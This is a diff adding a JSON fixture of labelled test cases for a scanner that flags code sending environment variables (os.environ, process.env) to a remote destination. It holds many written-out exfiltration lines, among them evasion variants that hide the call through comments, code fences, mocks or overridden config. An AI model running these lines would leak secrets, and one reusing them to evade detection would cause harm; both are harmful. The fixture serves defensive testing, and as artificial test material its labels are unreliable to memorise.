@@ -1,0 +1,2338 @@
+[
+ {
+  "expect": "clear",
+  "label": "axios_body_unused",
+  "text": "axios({body: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_body_unused_2",
+  "text": "axios({url: destination, body: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_data_overridden",
+  "text": "axios({url: destination, method: \"post\", data: process.env, data: \"fixed\"})"
+ },
+ {
+  "expect": "high",
+  "label": "axios_headers",
+  "text": "axios.post(destination, \"x\", {headers: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "axios_timeout",
+  "text": "axios.post(destination, \"x\", {timeout: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "axios_url_only",
+  "text": "axios({url: JSON.stringify(process.env)})"
+ },
+ {
+  "expect": "high",
+  "label": "cap_inside_one_fence",
+  "text": "~~~\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\nrequests.post(destination, json=os.environ)\naxios.post(destination, process.env)\n\n~~~\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "cap_interleaved",
+  "text": "~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n```\naxios.post(destination, process.env)\n```\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "cap_mixed_high_low",
+  "text": "~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n"
+ },
+ {
+  "expect": "high",
+  "label": "cap_ticks_first",
+  "text": "requests.post(destination, json=os.environ)\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n"
+ },
+ {
+  "expect": "high",
+  "label": "cap_ticks_last",
+  "text": "```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\nrequests.post(destination, json=os.environ)\n"
+ },
+ {
+  "expect": "high",
+  "label": "cap_ticks_middle",
+  "text": "```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\nrequests.post(destination, json=os.environ)\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n```\nrequests.post(destination, json=os.environ)\n```\n```\naxios.post(destination, process.env)\n```\n"
+ },
+ {
+  "expect": "high",
+  "label": "cap_tilde3_first",
+  "text": "requests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n"
+ },
+ {
+  "expect": "high",
+  "label": "cap_tilde3_last",
+  "text": "~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\nrequests.post(destination, json=os.environ)\n"
+ },
+ {
+  "expect": "high",
+  "label": "cap_tilde3_middle",
+  "text": "~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\nrequests.post(destination, json=os.environ)\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\naxios.post(destination, process.env)\n~~~\n"
+ },
+ {
+  "expect": "high",
+  "label": "cap_tilde4_first",
+  "text": "requests.post(destination, json=os.environ)\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n"
+ },
+ {
+  "expect": "high",
+  "label": "cap_tilde4_last",
+  "text": "~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\nrequests.post(destination, json=os.environ)\n"
+ },
+ {
+  "expect": "high",
+  "label": "cap_tilde4_middle",
+  "text": "~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n~~~~\nrequests.post(destination, json=os.environ)\n~~~~\n~~~~\naxios.post(destination, process.env)\n~~~~\n"
+ },
+ {
+  "expect": "clear",
+  "label": "comment_after_control",
+  "text": "if (x) /* note */ /axios.post(destination, process.env)/.test(s);"
+ },
+ {
+  "expect": "clear",
+  "label": "comment_after_value_is_a_comment",
+  "text": "const x = 1 // axios.post(destination, process.env)"
+ },
+ {
+  "expect": "clear",
+  "label": "comment_between_fields",
+  "text": "fetch(destination, {headers: {}, // axios.post(destination, process.env)\n cache: \"no-cache\"})"
+ },
+ {
+  "expect": "high",
+  "label": "comment_inside_arguments",
+  "text": "fetch(destination, {\n body: // note\n JSON.stringify(process.env)\n})"
+ },
+ {
+  "expect": "high",
+  "label": "computed_later_remote",
+  "text": "axios({url: \"http://localhost\", data: process.env, [\"url\"]: destination})"
+ },
+ {
+  "expect": "clear",
+  "label": "count_copy",
+  "text": "requests.post(destination, json=len(os.environ.copy()))"
+ },
+ {
+  "expect": "clear",
+  "label": "count_items",
+  "text": "requests.post(destination, json=len(os.environ.items()))"
+ },
+ {
+  "expect": "clear",
+  "label": "count_values",
+  "text": "requests.post(destination, json=len(os.environ.values()))"
+ },
+ {
+  "expect": "high",
+  "label": "division_after_bracket",
+  "text": "n = a[0] / b; axios.post(destination, process.env)"
+ },
+ {
+  "expect": "high",
+  "label": "division_after_paren",
+  "text": "n = (a) / b; axios.post(destination, process.env)"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_await",
+  "text": "n = obj.await / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_case",
+  "text": "n = obj.case / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_delete",
+  "text": "n = obj.delete / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_do",
+  "text": "n = obj.do / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_else",
+  "text": "n = obj.else / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_in",
+  "text": "n = obj.in / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_of",
+  "text": "n = obj.of / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_return",
+  "text": "n = obj.return / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_throw",
+  "text": "n = obj.throw / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_typeof",
+  "text": "n = obj.typeof / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_void",
+  "text": "n = obj.void / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_attribute_yield",
+  "text": "n = obj.yield / 2; axios.post(destination, process.env); n / 3"
+ },
+ {
+  "expect": "high",
+  "label": "division_chain",
+  "text": "n = a / b / c; axios.post(destination, process.env)"
+ },
+ {
+  "expect": "clear",
+  "label": "fetch_body_overridden",
+  "text": "fetch(destination, {method: \"POST\", body: JSON.stringify(process.env), body: \"fixed\"})"
+ },
+ {
+  "expect": "high",
+  "label": "fetch_computed_body",
+  "text": "fetch(destination, {[\"body\"]: JSON.stringify(process.env)})"
+ },
+ {
+  "expect": "high",
+  "label": "fetch_computed_body_2",
+  "text": "fetch(destination, {[\"body\"]: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "fetch_json_unused",
+  "text": "fetch(destination, {json: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "fetch_params_unused",
+  "text": "fetch(destination, {params: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "fetch_quoted_body",
+  "text": "fetch(destination, {\"body\": JSON.stringify(process.env)})"
+ },
+ {
+  "expect": "clear",
+  "label": "fetch_unused_option",
+  "text": "fetch(destination, {unused: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "fetch_url_contract",
+  "text": "fetch(destination, {url: JSON.stringify(process.env)})"
+ },
+ {
+  "expect": "high",
+  "label": "fetch_url_contract_2",
+  "text": "fetch(destination, {url: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "floor_div_multiline",
+  "text": "n = (8\n // 2); requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "floor_div_multiline_2",
+  "text": "n = (8\n // 2); requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "floor_div_string",
+  "text": "x=\"8 // 2\"; requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "got_context_only",
+  "text": "got(destination, {context: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "got_json_overridden",
+  "text": "got(destination, {method: \"POST\", json: process.env, json: {}})"
+ },
+ {
+  "expect": "high",
+  "label": "got_searchparams",
+  "text": "got(destination, {searchParams: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "got_url_contract",
+  "text": "got(destination, {url: JSON.stringify(process.env)})"
+ },
+ {
+  "expect": "high",
+  "label": "got_url_contract_2",
+  "text": "got(destination, {url: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "inline_js_comment",
+  "text": "let n = 1; // axios.post(destination, process.env)"
+ },
+ {
+  "expect": "high",
+  "label": "join_crlf",
+  "text": "requests.\\\r\npost(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "join_outside_string",
+  "text": "x=\"a\"\nrequests.\\\npost(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "join_string_only",
+  "text": "x=\"requests.\\\npost(destination, json=os.environ)\""
+ },
+ {
+  "expect": "clear",
+  "label": "local_axios_config",
+  "text": "axios({url: \"http://localhost:8080\", data: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "local_config_duplicate",
+  "text": "axios({url: \"http://localhost\", url: \"https://example.invalid\", data: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "local_config_overridden",
+  "text": "axios({url: \"http://localhost\", ...{url: \"https://example.invalid\"}, data: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "local_config_overridden_2",
+  "text": "axios({url: \"http://localhost\", data: process.env, ...remote})"
+ },
+ {
+  "expect": "clear",
+  "label": "local_fetch_options_spread",
+  "text": "fetch(\"http://localhost\", {...options, method: \"POST\", body: JSON.stringify(process.env)})"
+ },
+ {
+  "expect": "high",
+  "label": "local_later_remote",
+  "text": "axios({url: \"http://localhost\", data: process.env, url: destination})"
+ },
+ {
+  "expect": "clear",
+  "label": "local_template",
+  "text": "fetch(`http://localhost:8080`, {body: JSON.stringify(process.env)})"
+ },
+ {
+  "expect": "high",
+  "label": "mock_after",
+  "text": "requests.post(destination, json=os.environ)\npatch(\"requests.post\").start()"
+ },
+ {
+  "expect": "high",
+  "label": "mock_bound_after",
+  "text": "p = patch(\"requests.post\")\nrequests.post(destination, json=os.environ)\np.start()"
+ },
+ {
+  "expect": "high",
+  "label": "mock_bound_in_other_function",
+  "text": "def unused():\n    p = patch(\"requests.post\")\np = patch(\"httpx.post\")\np.start()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_bound_other_function",
+  "text": "p = patch(\"requests.post\")\ndef f():\n    p.start()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_bound_other_function_2",
+  "text": "p = patch(\"requests.post\")\ndef unused():\n    p.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_class_attribute",
+  "text": "class Unused:\n    p = patch(\"requests.post\")\np = patch(\"httpx.post\")\np.start()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_class_decorator",
+  "text": "@patch(\"requests.post\")\nclass Tests:\n    def test_first(self, m):\n        pass\n    def test_second(self, m):\n        requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_comparison_is_not_a_rebinding",
+  "text": "import os, requests\nfrom unittest.mock import patch\np = patch(\"requests.post\")\np == other\np.start()\nrequests.post(\"https://example.invalid/x\", json=os.environ)\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_decorator_exact",
+  "text": "@patch(\"requests.post\")\ndef test(m):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_decorator_near",
+  "text": "@patch(\"pkg.requests.post\")\ndef test(m):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_decorator_second_function",
+  "text": "@patch(\"requests.post\")\ndef first(m):\n    pass\ndef second():\n    requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_ended_scope",
+  "text": "with patch(\"requests.post\"):\n    pass\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_ended_scope_2",
+  "text": "with patch(\"requests.post\"):\n    pass\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_entered_parenthesised",
+  "text": "with (patch(\"requests.post\") as m, ctx()):\n    requests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_entered_second_manager",
+  "text": "with ctx(), patch(\"requests.post\"):\n    requests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_entered_with_alias",
+  "text": "with patch(\"requests.post\") as m:\n    requests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_member_assignment_is_not_a_rebinding",
+  "text": "import os, requests\nfrom unittest.mock import patch\np = patch(\"requests.post\")\nholder.p = other\np.start()\nrequests.post(\"https://example.invalid/x\", json=os.environ)\n"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_multiline_body",
+  "text": "with patch(\"requests.post\"):\n    value = (\n0\n    )\n    requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_multiline_call_context",
+  "text": "with patch(\n    \"requests.post\"\n):\n    requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_multiline_decorator",
+  "text": "@patch(\n    \"requests.post\"\n)\ndef test(m):\n    requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_multiline_with",
+  "text": "with (\n    patch(\"requests.post\")\n):\n    requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_multiline_with_2",
+  "text": "with (\n    patch(\"requests.post\")\n):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_other_function",
+  "text": "def f():\n    patch(\"requests.post\").start()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_other_function_2",
+  "text": "def unused():\n    patch(\"requests.post\").start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_outer_patcher_in_function",
+  "text": "p = patch(\"requests.post\")\ndef f():\n    p.start()\n    requests.post(u, json=os.environ)"
+ },
